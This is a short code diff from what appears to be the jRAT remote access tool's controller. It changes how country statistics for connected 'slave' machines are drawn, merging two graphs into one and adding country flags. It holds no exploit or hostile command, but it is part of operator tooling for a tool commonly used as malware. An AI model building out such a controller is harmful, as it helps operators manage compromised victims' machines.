@@ -12,6 +12,7 @@ import java.util.List;
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Globals;
 import se.jrat.client.ui.frames.Frame;
+import se.jrat.client.utils.FlagUtils;
 import se.jrat.common.Logger;
 
 import com.redpois0n.graphs.graph.GraphEntry;
@@ -101,18 +102,17 @@ public class CountryStatistics extends AbstractSettings implements Serializable 
 	}
 
 	public void reload() {
-		Frame.panelStats.totalGraph.clear();
-		Frame.panelStats.uniqueGraph.clear();
+		Frame.panelStats.countryGraph.clear();
 
 		for (int i = 0; i < list.size(); i++) {
 			CountryStatEntry entry = list.get(i);
 			try {
 
-				GraphEntry total = new GraphEntry(entry.getCountry(), entry.getConnects());
-				GraphEntry unique = new GraphEntry(entry.getCountry(), entry.getList().size());
+				GraphEntry total = new GraphEntry(entry.getCountry(), entry.getConnects(), FlagUtils.getFlag(entry.getCountry()));
+				//GraphEntry unique = new GraphEntry(entry.getCountry(), entry.getList().size());
 
-				Frame.panelStats.totalGraph.add(total);
-				Frame.panelStats.uniqueGraph.add(unique);
+				Frame.panelStats.countryGraph.add(total);
+				//Frame.panelStats.countryGraph.add(unique);
 				Frame.panelStats.repaint();
 
 			} catch (Exception e) {
